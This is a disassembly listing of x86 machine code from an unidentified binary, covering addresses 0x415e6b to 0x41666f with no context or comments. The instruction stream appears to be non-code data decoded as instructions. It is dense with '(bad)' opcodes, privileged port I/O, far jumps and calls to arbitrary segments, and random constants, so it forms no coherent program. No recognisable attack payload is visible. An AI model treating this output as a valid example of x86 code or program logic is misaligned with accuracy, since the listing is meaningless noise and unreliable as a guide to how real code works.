  415e6b:	imul   edi,DWORD PTR [edx],0xb
  415e6e:	jmp    0xa33c:0xc9f6c6a4
  415e75:	mov    WORD PTR [edi+0x9],?
  415e78:	cld    
  415e79:	mov    eax,ds:0xb5e1ac88
  415e7e:	xchg   DWORD PTR [ebp+0x5a1e17de],ebp
  415e84:	out    dx,al
  415e85:	jle    0x415e8b
  415e87:	js     0x415e7a
  415e89:	adc    eax,esi
  415e8b:	lock shr DWORD PTR [edi+0x5d],cl
  415e8f:	out    dx,al
  415e90:	xchg   esi,eax
  415e91:	out    0xd4,eax
  415e93:	mov    DWORD PTR [edx-0x63],0xf94d9281
  415e9a:	pop    ecx
  415e9b:	sahf   
  415e9c:	and    eax,0x2bb8c8f
  415ea1:	aaa    
  415ea2:	mov    ds,WORD PTR [eax+0x46]
  415ea5:	pop    edx
  415ea6:	and    edx,DWORD PTR [edx+0x2dca7f3e]
  415eac:	ds mov esi,0xe4e3d422
  415eb2:	jmp    0xe5b:0xb5fec543
  415eb9:	mov    edx,0x7d5d0d0d
  415ebe:	jp     0x415ea5
  415ec0:	fsub   st,st(1)
  415ec2:	(bad)  
  415ec4:	rol    DWORD PTR [ebx-0x794cea11],cl
  415eca:	jecxz  0x415ed5
  415ecc:	ror    BYTE PTR gs:[edi+0x75ce5dbc],0x35
  415ed4:	mov    edx,0xc5cb119b
  415ed9:	push   edi
  415eda:	in     eax,0x58
  415edc:	int3   
  415edd:	mov    ebx,0x483e2dc7
  415ee2:	dec    DWORD PTR [ebx-0x529a4074]
  415ee8:	lea    esi,[edi]
  415eea:	xor    BYTE PTR [ebp+0x2],0xcb
  415eee:	sbb    al,0x53
  415ef0:	std    
  415ef1:	adc    eax,0xa38f87eb
  415ef6:	mov    ch,0xf6
  415ef8:	in     eax,dx
  415ef9:	mov    ds:0x30c6d39,eax
  415efe:	adc    DWORD PTR [ecx+0x4b],ebp
  415f01:	and    DWORD PTR [eax+ebx*2+0x177cd712],0x54
  415f09:	ficom  WORD PTR [edx]
  415f0b:	sbb    ebp,esp
  415f0d:	xor    ah,BYTE PTR [edi+edi*2]
  415f10:	punpcklbw mm2,DWORD PTR [edi+0x57]
  415f14:	ja     0x415eb9
  415f16:	pop    edx
  415f17:	cmc    
  415f18:	sbb    al,0xba
  415f1a:	cmp    ch,BYTE PTR [ebp-0x37a2cfdd]
  415f20:	enter  0x52e,0x28
  415f24:	in     al,0x81
  415f26:	pop    esi
  415f27:	sbb    bh,BYTE PTR [ebx]
  415f29:	add    bh,ch
  415f2b:	stos   BYTE PTR es:[edi],al
  415f2c:	and    al,0x57
  415f2e:	mov    bh,0xa9
  415f30:	pusha  
  415f31:	jo     0x415ec1
  415f33:	pop    edx
  415f34:	pushf  
  415f35:	scas   al,BYTE PTR es:[edi]
  415f36:	sbb    al,0xd1
  415f38:	adc    BYTE PTR [ebx],bl
  415f3a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  415f3c:	xchg   ebp,eax
  415f3d:	add    esp,esp
  415f3f:	or     al,0x4c
  415f41:	sbb    eax,0x1d2f91a8
  415f46:	sti    
  415f47:	and    ah,BYTE PTR [ebp-0x70]
  415f4a:	cmovae eax,DWORD PTR [ebx]
  415f4d:	pop    edx
  415f4e:	les    eax,FWORD PTR [esi-0xd]
  415f51:	icebp  
  415f52:	jae    0x415f19
  415f54:	shr    BYTE PTR ds:0x6889a600,cl
  415f5a:	cmc    
  415f5b:	or     eax,0xf2c3503f
  415f60:	mov    ebx,?
  415f62:	pop    esp
  415f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f64:	push   esp
  415f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f66:	adc    al,0xb3
  415f68:	xchg   edi,eax
  415f69:	not    BYTE PTR [edi]
  415f6b:	xchg   BYTE PTR [ebp-0x5c],bl
  415f6e:	push   eax
  415f6f:	arpl   WORD PTR [ebp-0x13fc4238],si
  415f75:	xchg   DWORD PTR [edi-0x4b],eax
  415f78:	xchg   esp,eax
  415f79:	xor    DWORD PTR [ebx],0x5d5af89
  415f7f:	addr16 cdq 
  415f81:	loopne 0x415f13
  415f83:	cld    
  415f84:	sub    eax,0xd0e19173
  415f89:	xchg   ecx,eax
  415f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f8b:	test   eax,0xe6a63869
  415f90:	les    edx,FWORD PTR [edi+0x6a]
  415f93:	push   ebp
  415f94:	mov    ds:0xfce129bd,al
  415f99:	sbb    ch,BYTE PTR [edi-0x6b4fef2c]
  415f9f:	mov    BYTE PTR [ecx+0xd],dl
  415fa2:	adc    eax,0xcd927b32
  415fa7:	and    BYTE PTR [ebx+0x6d],bh
  415faa:	push   ebp
  415fab:	jb     0x416020
  415fad:	jecxz  0x41601e
  415faf:	add    ah,BYTE PTR [ecx]
  415fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb2:	adc    eax,0xfb7760c4
  415fb7:	mov    esp,0xff7e5ddc
  415fbc:	mov    esp,0xeb70d055
  415fc1:	punpcklbw mm0,DWORD PTR [eax+0x3caadc87]
  415fc8:	repz pusha 
  415fca:	pop    es
  415fcb:	mov    esp,0x6dd5d828
  415fd0:	inc    edx
  415fd1:	push   0x51
  415fd3:	aaa    
  415fd4:	push   cs
  415fd5:	xchg   esp,eax
  415fd6:	add    al,0x28
  415fd8:	mov    al,ds:0xf0f98724
  415fdd:	pop    esi
  415fde:	mov    ecx,0x4474ae3c
  415fe3:	outs   dx,DWORD PTR ds:[esi]
  415fe4:	cmp    edx,DWORD PTR [esi-0x67]
  415fe7:	test   al,0x93
  415fe9:	pop    ecx
  415fea:	xor    esi,DWORD PTR [ebx]
  415fec:	aad    0x81
  415fee:	stc    
  415fef:	inc    edi
  415ff0:	mov    bh,0xa
  415ff2:	dec    esi
  415ff3:	pop    esi
  415ff4:	xor    al,0xcd
  415ff6:	ficomp WORD PTR [esi+eax*8]
  415ff9:	mov    al,ds:0xc120e9e8
  415ffe:	es jo  0x416026
  416001:	jge    0x415f9a
  416003:	or     al,0x91
  416005:	pop    ebp
  416006:	repnz adc BYTE PTR ds:[ecx+0x11],0xac
  41600c:	rcl    esi,0x9
  41600f:	adc    dl,BYTE PTR [esi+0x474c72cb]
  416015:	or     BYTE PTR [edi+edx*1],ah
  416018:	out    0x4c,al
  41601a:	fdivr  DWORD PTR [eax+0x3a]
  41601d:	and    eax,0x4818a3c4
  416022:	mov    edi,0xa71bc30f
  416027:	repnz inc ecx
  416029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41602a:	mov    esp,0x7a09d1a3
  41602f:	mov    eax,0x45122acf
  416034:	fisubr WORD PTR [esi+0x4e]
  416037:	push   cs
  416038:	jp     0x416096
  41603a:	jp     0x416037
  41603c:	popf   
  41603d:	cmp    BYTE PTR [esi+ebp*8+0x6d],0x52
  416042:	push   ebx
  416043:	and    bh,BYTE PTR [edx+0x254589da]
  416049:	or     edi,esp
  41604b:	popf   
  41604c:	and    al,0x77
  41604e:	jno    0x41602b
  416050:	xor    esi,esp
  416052:	mov    WORD PTR [esi],fs
  416054:	jne    0x41602a
  416056:	push   eax
  416057:	dec    edi
  416058:	cwde   
  416059:	cmp    eax,0x403a780a
  41605e:	xchg   ecx,eax
  41605f:	arpl   WORD PTR [edx+edi*2+0x7],dx
  416063:	add    eax,0x1db913af
  416068:	mov    dh,0xdf
  41606a:	aad    0x65
  41606c:	push   ss
  41606d:	xchg   ebp,eax
  41606e:	daa    
  41606f:	sbb    ecx,ecx
  416071:	leave  
  416072:	or     edi,DWORD PTR [eax+0x74676072]
  416078:	sbb    DWORD PTR [esi-0x5ed8407e],ecx
  41607e:	push   edi
  41607f:	call   0x76b:0x58b5
  416085:	lahf   
  416086:	sub    ch,dl
  416088:	push   ds
  416089:	fwait
  41608a:	xchg   edi,eax
  41608b:	inc    ecx
  41608c:	mov    eax,0xe1551917
  416091:	inc    edx
  416092:	(bad)  [ebp-0xc]
  416095:	mov    ebx,0xcd98ed38
  41609a:	mov    edi,0x8ab046cb
  41609f:	mov    bh,0x92
  4160a1:	add    ecx,eax
  4160a3:	ins    BYTE PTR es:[edi],dx
  4160a4:	push   ds
  4160a5:	iret   
  4160a6:	mov    eax,0xd66b99e4
  4160ab:	adc    al,0x83
  4160ad:	xabort 0xad
  4160b0:	add    eax,DWORD PTR [ecx+edi*2-0x42139ad]
  4160b7:	mov    WORD PTR [ebx-0x21],gs
  4160ba:	mov    edi,0xa354abcb
  4160bf:	jp     0x41613d
  4160c1:	lods   al,BYTE PTR ds:[esi]
  4160c2:	and    al,0x48
  4160c4:	sub    al,0xd4
  4160c6:	cmp    ecx,DWORD PTR [edx-0x5ca291f2]
  4160cc:	mov    ch,BYTE PTR [eax+0x11]
  4160cf:	mov    BYTE PTR [ecx+eiz*2+0x70],cl
  4160d3:	jg     0x416140
  4160d5:	xor    DWORD PTR [esi-0x50a532b6],ebp
  4160db:	jle    0x4160fc
  4160dd:	or     DWORD PTR [eax+0x42],edi
  4160e0:	cs es and al,0x2f
  4160e4:	lock or al,BYTE PTR [edx+0x5d]
  4160e8:	es cli 
  4160ea:	shr    DWORD PTR [edi-0x43],1
  4160ed:	getsec 
  4160ef:	aam    0x24
  4160f1:	aam    0x2b
  4160f3:	or     dl,0x22
  4160f6:	or     ah,BYTE PTR [esi]
  4160f8:	test   edi,0xd38bddaa
  4160fe:	dec    edi
  4160ff:	mov    DWORD PTR [edx],ebp
  416101:	mov    ebx,esp
  416103:	in     eax,0x32
  416105:	mov    cl,0xe9
  416107:	or     BYTE PTR [edi-0x4dcd4309],al
  41610d:	retf   
  41610e:	push   0x2f11d100
  416113:	cwde   
  416114:	nop
  416115:	jge    0x416138
  416117:	adc    DWORD PTR [esi+0x7c],ebx
  41611a:	cmp    al,0xce
  41611c:	push   0xffffff9a
  41611e:	inc    eax
  41611f:	xchg   esi,eax
  416120:	aas    
  416121:	adc    BYTE PTR [ebp+0x29],al
  416124:	push   ss
  416125:	pop    eax
  416126:	out    0x6f,al
  416128:	mov    ds:0x4fdacdea,eax
  41612d:	sub    DWORD PTR [edi+0x13d12aca],eax
  416133:	fstp   TBYTE PTR [esi+0x406348ba]
  416139:	mov    al,ds:0xa020893b
  41613e:	pop    ss
  41613f:	jb     0x416168
  416141:	xchg   edi,eax
  416142:	cmp    dl,bl
  416144:	jl     0x4160d2
  416146:	hlt    
  416147:	jle    0x41610f
  416149:	ret    
  41614a:	adc    eax,DWORD PTR [edi+0xd]
  41614d:	lods   eax,DWORD PTR ds:[esi]
  41614e:	mov    eax,0x70568fcf
  416153:	(bad)  
  416157:	xchg   DWORD PTR [ebx+0x11],esi
  41615a:	repz cmp esi,DWORD PTR [ecx+0x30]
  41615e:	data16 sti 
  416160:	jo     0x41615d
  416162:	shl    DWORD PTR [edi],0xcd
  416165:	mov    dh,0xd3
  416167:	call   0xce7f:0xf8ced4ad
  41616e:	push   cs
  41616f:	cmp    al,0x6a
  416171:	notrack jmp DWORD PTR [ebp-0x59fb5a94]
  416178:	fucomip st,st(5)
  41617a:	dec    DWORD PTR [esi-0x37]
  41617d:	stos   DWORD PTR es:[edi],eax
  41617e:	mov    DWORD PTR [ebp-0x7832cd22],0x6a3ca513
  416188:	or     ebx,ecx
  41618a:	adc    eax,0x307e3c57
  41618f:	aad    0xb0
  416191:	mov    dh,0x70
  416193:	mov    es,WORD PTR [edx-0x11]
  416196:	retf   0x8418
  416199:	mov    DWORD PTR [eax-0x37],ebp
  41619c:	mov    al,ds:0x68d8cae0
  4161a1:	inc    esp
  4161a2:	inc    ebx
  4161a3:	push   esp
  4161a4:	jae    0x41615c
  4161a6:	jbe    0x41620b
  4161a8:	mov    ah,0xe0
  4161aa:	add    DWORD PTR [edx],ebp
  4161ac:	xor    ebp,edi
  4161ae:	cmp    eax,0x13f34633
  4161b3:	ret    0x4e00
  4161b6:	add    eax,0xa9c2ce0
  4161bb:	dec    eax
  4161bc:	pop    ebx
  4161bd:	pop    ds
  4161be:	jge    0x41619d
  4161c0:	pop    esi
  4161c1:	out    0xfd,eax
  4161c3:	clc    
  4161c4:	(bad)  
  4161c5:	dec    edx
  4161c6:	mov    edi,0x11e14d0f
  4161cb:	mov    bh,0x6f
  4161cd:	mov    al,0xae
  4161cf:	inc    ebx
  4161d0:	inc    esi
  4161d1:	xchg   DWORD PTR [eax],edi
  4161d3:	add    al,0xff
  4161d5:	adc    al,0x8f
  4161d8:	rcl    esi,0xbc
  4161db:	call   0x34ee:0xa4efca35
  4161e2:	retf   
  4161e3:	int3   
  4161e4:	pop    ebx
  4161e5:	hlt    
  4161e6:	sti    
  4161e7:	and    BYTE PTR [edx],0x80
  4161ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161eb:	adc    eax,0xf310d49d
  4161f0:	xchg   edi,eax
  4161f1:	repz add ebx,DWORD PTR [edx-0x70]
  4161f5:	arpl   WORD PTR [esi+0x2b2e3413],si
  4161fb:	call   0xd272:0x78cbe952
  416202:	add    al,0x1
  416204:	pop    ss
  416205:	xlat   BYTE PTR ds:[ebx]
  416206:	dec    esp
  416207:	sbb    ch,BYTE PTR [ecx+esi*8-0x69]
  41620b:	ret    0x3b2c
  41620e:	aaa    
  41620f:	mov    BYTE PTR [edi-0x19ebff4a],dh
  416215:	(bad)  
  416216:	fdivr  DWORD PTR [esi+0x63]
  416219:	mov    bh,0xde
  41621b:	in     eax,0xdd
  41621d:	adc    dh,bl
  41621f:	rcl    DWORD PTR [ebx-0xb37ccc6],cl
  416225:	mov    bl,0x80
  416227:	push   0xffffff84
  416229:	xchg   edx,eax
  41622a:	sub    al,0xc8
  41622c:	and    cl,BYTE PTR [ebp-0x25e9655c]
  416232:	mov    BYTE PTR [ebx],ah
  416234:	xor    BYTE PTR [eax],dh
  416236:	dec    edx
  416237:	retf   0x8702
  41623a:	dec    edx
  41623b:	add    DWORD PTR [ebx+0xaf15d13],ecx
  416241:	aas    
  416242:	outs   dx,DWORD PTR ds:[esi]
  416243:	xchg   esp,eax
  416244:	and    edx,DWORD PTR [edx]
  416246:	push   ds
  416247:	icebp  
  416248:	loop   0x4162c7
  41624a:	mov    al,ds:0x1cfd309c
  41624f:	mov    ?,ebx
  416251:	xlat   BYTE PTR ds:[ebx]
  416252:	pusha  
  416253:	push   eax
  416254:	push   ds
  416255:	adc    BYTE PTR [ebp+0x73f753e1],ch
  41625b:	nop
  41625c:	test   DWORD PTR [edx+0x7c],0xc941c981
  416263:	(bad)  
  416264:	push   eax
  416265:	ror    BYTE PTR [edi+0x17],cl
  416268:	xchg   esp,eax
  416269:	rcl    DWORD PTR [edx],cl
  41626b:	loope  0x41622e
  41626d:	xor    bl,BYTE PTR [ecx+0xa9e3cfd]
  416273:	mov    bh,0x58
  416275:	jae    0x416253
  416277:	in     eax,0x22
  416279:	inc    esi
  41627a:	mov    al,ds:0x66957f7c
  41627f:	aam    0x75
  416281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416282:	adc    bl,BYTE PTR [edx-0x35]
  416285:	mov    edi,0xfa265078
  41628a:	out    dx,al
  41628b:	retf   
  41628c:	mov    ebx,0x1d6cc069
  416291:	jmp    0x4162d2
  416293:	mov    esi,0xac526d29
  416298:	push   edi
  416299:	mov    bl,0xbf
  41629b:	stos   BYTE PTR es:[edi],al
  41629c:	or     BYTE PTR [ebx+0x68],0x77
  4162a0:	xor    al,0x24
  4162a2:	cld    
  4162a3:	inc    edi
  4162a4:	icebp  
  4162a5:	cmp    dl,BYTE PTR [esi]
  4162a7:	fwait
  4162a8:	or     ecx,DWORD PTR [edx]
  4162aa:	adc    DWORD PTR [ecx],ebp
  4162ac:	push   esi
  4162ad:	scas   al,BYTE PTR es:[edi]
  4162ae:	mov    edx,0x8475d371
  4162b3:	call   0xa5a86762
  4162b8:	div    DWORD PTR [eax]
  4162ba:	jmp    0xee11:0xe2c36b58
  4162c1:	mov    es,WORD PTR [edi+0x2b]
  4162c4:	add    ah,bl
  4162c6:	cvtpi2ps xmm7,mm2
  4162c9:	and    al,0x30
  4162cb:	stos   DWORD PTR es:[edi],eax
  4162cc:	in     al,dx
  4162cd:	add    al,0x36
  4162cf:	jbe    0x4162ea
  4162d1:	cmc    
  4162d2:	pop    edx
  4162d3:	jecxz  0x4162c9
  4162d5:	dec    ecx
  4162d6:	mov    BYTE PTR [eax+eiz*1+0x6c5dbce6],ch
  4162dd:	ds inc esi
  4162df:	inc    ebp
  4162e0:	cwde   
  4162e1:	sub    edi,DWORD PTR [ecx+0x393e86a5]
  4162e7:	xchg   al,al
  4162e9:	push   eax
  4162ea:	sbb    ah,ah
  4162ec:	dec    edx
  4162ed:	sub    eax,0x2fd35a2a
  4162f2:	test   DWORD PTR cs:[ecx+edx*4+0xffa87b9],ebp
  4162fa:	cmp    dl,BYTE PTR [ebp+esi*2-0x6f]
  4162fe:	sar    eax,0x1f
  416301:	mov    dh,0x44
  416303:	cmp    dl,BYTE PTR [esi]
  416305:	mov    DWORD PTR [edx+0x53],edi
  416308:	push   edx
  416309:	cmp    ebp,DWORD PTR [esi+0x4d]
  41630c:	lea    edx,[ebx]
  41630e:	fmul   st,st(1)
  416310:	ins    BYTE PTR es:[edi],dx
  416311:	ret    0x4b8f
  416314:	test   dl,bh
  416316:	inc    ebp
  416317:	retf   0xdf12
  41631a:	fiadd  DWORD PTR [ebx+0x4a]
  41631d:	popf   
  41631e:	mov    bh,0x39
  416320:	push   ds
  416321:	call   0x800d:0x37f22236
  416328:	(bad)  
  416329:	sbb    ebp,DWORD PTR [edx-0x2b]
  41632c:	jp     0x416334
  41632e:	dec    BYTE PTR [eax-0x4a]
  416331:	jp     0x4162c3
  416333:	push   0x43
  416335:	cmp    edi,edi
  416337:	cmc    
  416338:	pop    edi
  416339:	mov    eax,ds:0x51cf9a17
  41633e:	mov    ecx,0x5809f214
  416343:	js     0x4162f2
  416345:	cmp    BYTE PTR [ecx],0x91
  416348:	push   edi
  416349:	sub    cl,BYTE PTR [eax]
  41634b:	iret   
  41634c:	lods   eax,DWORD PTR ds:[esi]
  41634d:	xchg   esi,eax
  41634e:	aas    
  41634f:	xor    al,0x22
  416351:	push   eax
  416352:	jnp    0x416359
  416354:	jmp    0xcd0f7d03
  416359:	cmp    ebp,DWORD PTR [ecx+0x670fbb0b]
  41635f:	repz pop ss
  416361:	xor    DWORD PTR [ebx],ecx
  416363:	and    DWORD PTR [edi-0x306d1edc],esi
  416369:	call   0x1c41:0xc5845c2e
  416370:	into   
  416371:	aas    
  416372:	sbb    eax,0x91526a59
  416377:	outs   dx,DWORD PTR ds:[esi]
  416378:	adc    esi,DWORD PTR [ecx-0x53148e8e]
  41637e:	fwait
  41637f:	sbb    ebp,DWORD PTR [edi+0x40]
  416382:	push   ebp
  416383:	mov    ch,0x28
  416385:	jne    0x4163cb
  416387:	std    
  416388:	push   ecx
  416389:	cmp    al,0x17
  41638b:	cli    
  41638c:	push   eax
  41638d:	lods   al,BYTE PTR ds:[esi]
  41638e:	lahf   
  41638f:	adc    edx,DWORD PTR [eax-0x6f88f017]
  416395:	mov    dh,0xf8
  416397:	hlt    
  416398:	mov    ch,0x46
  41639a:	(bad)  
  41639b:	ror    cl,0xf8
  41639e:	pop    ebx
  41639f:	mov    al,ds:0x9a4f857f
  4163a4:	pop    esp
  4163a5:	test   al,0x61
  4163a7:	xlat   BYTE PTR ds:[ebx]
  4163a8:	std    
  4163a9:	add    edi,ecx
  4163ab:	add    cl,BYTE PTR [ebx+0x8]
  4163ae:	mov    ebp,0x9ed58aaa
  4163b3:	jg     0x416377
  4163b5:	jne    0x4163c4
  4163b7:	fwait
  4163b8:	enter  0x9cc7,0xf4
  4163bc:	pop    ebx
  4163bd:	and    esp,esp
  4163bf:	dec    esi
  4163c0:	mov    edi,0x7ea1fef6
  4163c5:	ret    0x6fdc
  4163c8:	aam    0x72
  4163ca:	inc    edi
  4163cb:	mov    esi,0x24446562
  4163d0:	push   0x15ba9026
  4163d5:	xchg   esp,eax
  4163d6:	mov    ds,WORD PTR [ebp-0x63b92e1b]
  4163dc:	fadd   QWORD PTR [eax+0x7d70d311]
  4163e2:	je     0x41636d
  4163e4:	lods   al,BYTE PTR ds:[esi]
  4163e5:	test   BYTE PTR [edx+edx*2+0x667fb2ab],0x1a
  4163ed:	test   eax,0x9c1d3a69
  4163f2:	push   es
  4163f3:	mov    esp,0x8d49c749
  4163f8:	cs je  0x4163df
  4163fb:	aaa    
  4163fc:	mov    ah,0xbf
  4163fe:	stos   DWORD PTR es:[edi],eax
  4163ff:	ret    
  416400:	mov    dh,dh
  416402:	jl     0x4163eb
  416404:	mov    ds:0xf0fa31f0,al
  416409:	sbb    dh,BYTE PTR [edx]
  41640b:	inc    ecx
  41640c:	xchg   edx,eax
  41640d:	push   ds
  41640e:	xlat   BYTE PTR ds:[ebx]
  41640f:	pushf  
  416410:	jnp    0x416394
  416412:	icebp  
  416413:	dec    esi
  416414:	add    esp,ebx
  416416:	pop    ebx
  416417:	shr    DWORD PTR [esi-0x7c],0x8d
  41641b:	pop    esi
  41641c:	fisubr DWORD PTR [eax+esi*4-0x76]
  416420:	hlt    
  416421:	push   ebx
  416422:	push   cs
  416423:	xchg   esi,eax
  416424:	inc    eax
  416425:	fisttp QWORD PTR [esi-0x12b948e4]
  41642b:	lds    ecx,FWORD PTR ds:0x64b2aa63
  416431:	call   0x9c510481
  416436:	mov    ds:0xf08f5295,eax
  41643b:	loop   0x416458
  41643d:	jp     0x4163e7
  41643f:	or     BYTE PTR [ecx+0x395afe8f],cl
  416445:	sbb    ah,dh
  416447:	les    ebp,FWORD PTR [ebx]
  416449:	mov    edx,0xcfc8079c
  41644e:	ss push ss
  416450:	mov    ds:0x2f3a031e,al
  416455:	fstp   DWORD PTR [esi+0x5a]
  416458:	mov    BYTE PTR [ebx+ecx*8+0x8e0b1a7],0xe
  416460:	enter  0x15c1,0xd7
  416464:	nop
  416465:	ds mov dh,0x28
  416468:	cmovno ecx,DWORD PTR [eax-0x75]
  41646c:	loope  0x416482
  41646e:	inc    eax
  41646f:	das    
  416470:	mov    edx,0x930a680a
  416475:	mov    ebp,0x291c1a02
  41647a:	stos   DWORD PTR es:[edi],eax
  41647b:	rol    BYTE PTR [edx-0x34],1
  41647e:	out    0xc5,eax
  416480:	cld    
  416481:	cs sbb ah,ch
  416484:	mov    ds:0x91fe10e7,eax
  416489:	cmp    al,0xe7
  41648b:	int    0x5b
  41648d:	push   ebx
  41648e:	xor    al,0xc9
  416490:	push   esp
  416491:	mov    bh,0x4a
  416493:	jbe    0x416487
  416495:	es aaa 
  416497:	sti    
  416498:	repnz outs dx,BYTE PTR ds:[esi]
  41649a:	and    al,0x96
  41649c:	or     DWORD PTR [eax+ebp*4],0xeb2421a9
  4164a3:	jecxz  0x416521
  4164a5:	fucom  st(3)
  4164a7:	pop    ss
  4164a8:	hlt    
  4164a9:	ret    
  4164aa:	clc    
  4164ab:	mov    cs,WORD PTR [edx-0x158860c5]
  4164b1:	pop    ecx
  4164b2:	dec    esi
  4164b3:	in     eax,0x7
  4164b5:	sbb    DWORD PTR [ecx],ebp
  4164b7:	pop    ebp
  4164b8:	inc    edx
  4164b9:	xchg   ecx,eax
  4164ba:	daa    
  4164bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164bc:	pop    edi
  4164bd:	stos   DWORD PTR es:[edi],eax
  4164be:	clc    
  4164bf:	mov    edx,0x28fb4ade
  4164c4:	jno    0x416531
  4164c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164c7:	cmp    esp,edx
  4164c9:	mov    al,0xf7
  4164cb:	inc    edi
  4164cc:	jmp    0x4164c9
  4164ce:	mov    ecx,0x488f7ae7
  4164d3:	mov    ah,BYTE PTR [eax-0x2f]
  4164d6:	or     ah,dl
  4164d8:	pop    ebp
  4164d9:	pop    edx
  4164da:	and    ah,al
  4164dc:	jo     0x4164cf
  4164de:	inc    edx
  4164df:	in     eax,0x8a
  4164e1:	imul   eax,DWORD PTR [edi-0x456b10df],0xffffffe9
  4164e8:	leave  
  4164e9:	imul   edi,DWORD PTR [eax+0x63],0xfffffffb
  4164ed:	cmp    eax,DWORD PTR [eax]
  4164ef:	mov    esp,0x9f27124d
  4164f4:	ins    BYTE PTR es:[edi],dx
  4164f5:	(bad)  [ebx+0x76]
  4164f8:	adc    eax,DWORD PTR [esp+ecx*4+0x7a]
  4164fc:	mov    eax,0x610aa582
  416501:	repnz push ss
  416503:	jecxz  0x416581
  416505:	adc    al,BYTE PTR [edx]
  416507:	pop    edx
  416508:	mov    dh,0x95
  41650a:	xlat   BYTE PTR ds:[ebx]
  41650b:	hlt    
  41650c:	push   eax
  41650d:	pushf  
  41650e:	sub    eax,0x295028ef
  416513:	pop    ds
  416514:	mov    esp,0xcd842f12
  416519:	sub    BYTE PTR [esi],dl
  41651b:	xchg   esp,eax
  41651c:	int    0x53
  41651e:	fcomp  QWORD PTR [edi]
  416520:	mov    eax,0x1b7d99fc
  416525:	push   eax
  416526:	add    eax,0x1ed86899
  41652b:	fs cwde 
  41652d:	push   ebp
  41652e:	sahf   
  41652f:	addr16 sbb al,0xca
  416532:	lea    edi,[edi]
  416534:	xchg   ecx,eax
  416535:	dec    esi
  416536:	inc    esp
  416537:	aam    0xf8
  416539:	mov    al,0x53
  41653b:	in     al,dx
  41653c:	cdq    
  41653d:	push   ds
  41653e:	pushf  
  41653f:	aad    0x8b
  416541:	push   0x77f34c40
  416546:	rol    DWORD PTR [edi],cl
  416548:	test   DWORD PTR [ebp-0x423b20c2],0x75d1d368
  416552:	adc    eax,0x6145a97a
  416557:	es and ebx,0xffffffe9
  41655b:	imul   ebp,DWORD PTR [ebx],0xa7c7cb5b
  416561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416562:	jns    0x416576
  416564:	idiv   cl
  416566:	jbe    0x416584
  416568:	cmp    bl,dh
  41656a:	adc    BYTE PTR [edi-0x6842b45c],bh
  416570:	cli    
  416571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416572:	or     edx,DWORD PTR [ecx-0x21]
  416575:	mov    dh,al
  416577:	cmp    DWORD PTR [edi],esp
  416579:	inc    ebx
  41657a:	mov    WORD PTR [edi-0x18],ds
  41657d:	or     al,0x94
  41657f:	in     eax,dx
  416580:	ret    0x75cc
  416583:	inc    esi
  416584:	ret    0xe26d
  416587:	jp     0x416515
  416589:	(bad)  
  41658a:	into   
  41658b:	test   al,0x4
  41658d:	sbb    DWORD PTR [esi+eax*2],edx
  416590:	mov    DWORD PTR [eax+0x8],0x5ab130e6
  416597:	addr16 mov ah,0x3c
  41659a:	cmp    al,0x18
  41659c:	test   BYTE PTR [ecx+0x35],0x17
  4165a0:	sete   BYTE PTR [ebp+0xca91726]
  4165a7:	or     al,0x68
  4165a9:	in     al,0x30
  4165ab:	dec    esi
  4165ac:	mov    al,BYTE PTR [esi+0x68552aff]
  4165b2:	ret    0xd152
  4165b5:	int    0xa7
  4165b7:	js     0x41662a
  4165b9:	data16 and BYTE PTR [ebx-0x4e],0x96
  4165be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165bf:	dec    eax
  4165c0:	push   cs
  4165c1:	fidiv  DWORD PTR [ebp-0x48]
  4165c4:	fbstp  TBYTE PTR [ebx+ebx*2]
  4165c7:	mov    esp,0x97db9e97
  4165cc:	sbb    al,0x63
  4165ce:	or     cl,ch
  4165d0:	test   DWORD PTR [ecx],edx
  4165d2:	inc    eax
  4165d3:	mov    ds:0x5a2efe50,al
  4165d8:	push   esp
  4165d9:	mov    eax,ds:0xa4f770c5
  4165de:	pop    ebx
  4165df:	cmc    
  4165e0:	jle    0x41664d
  4165e2:	and    bh,BYTE PTR [ecx-0x6e636d01]
  4165e8:	dec    esp
  4165e9:	(bad)  ds:[ebx+ecx*8-0x2d]
  4165ee:	in     al,0x35
  4165f0:	or     bl,BYTE PTR cs:[edi-0x2e]
  4165f4:	out    0x89,al
  4165f6:	mov    ebp,0xfada11d8
  4165fb:	sahf   
  4165fc:	mov    al,0x43
  4165fe:	cmp    DWORD PTR [edx+0x7a],0xffffffe7
  416602:	xchg   ebp,eax
  416603:	hlt    
  416604:	mov    DWORD PTR [edi],esp
  416606:	mov    ecx,0x49719829
  41660b:	inc    edx
  41660c:	pop    ecx
  41660d:	in     al,dx
  41660e:	repz sbb al,0x5e
  416611:	aas    
  416612:	in     eax,0xfd
  416614:	stos   BYTE PTR es:[edi],al
  416615:	jne    0x4165ec
  416617:	mov    ebx,0xe46e4e7a
  41661c:	int    0x79
  41661e:	daa    
  41661f:	mov    eax,0x354702c0
  416624:	scas   eax,DWORD PTR es:[edi]
  416625:	xchg   ebp,eax
  416626:	mov    ds:0x7e41f10c,eax
  41662b:	mov    ecx,DWORD PTR [esp+eiz*2-0x4d7615cf]
  416632:	rol    DWORD PTR [edx-0x4a],0x39
  416636:	xor    eax,DWORD PTR [esi-0x69bba196]
  41663c:	in     eax,dx
  41663d:	or     ah,BYTE PTR fs:[edi+0x3a22da2b]
  416644:	cmp    DWORD PTR [ebp+ecx*4+0x613a6fa8],ebx
  41664b:	jge    0x416604
  41664d:	inc    ebp
  41664e:	inc    esi
  41664f:	and    DWORD PTR [esi-0xde4cdc4],ebp
  416655:	mov    ds:0x408c8aa4,al
  41665a:	jne    0x4166a7
  41665c:	test   BYTE PTR [ecx+0x589c7e3e],bh
  416662:	push   ecx
  416663:	cli    
  416664:	push   cs
  416665:	mov    BYTE PTR [ecx-0x378a9e28],bh
  41666b:	inc    ecx
  41666c:	adc    BYTE PTR [esi-0x54],dl
  41666f:	test   al,0x2f
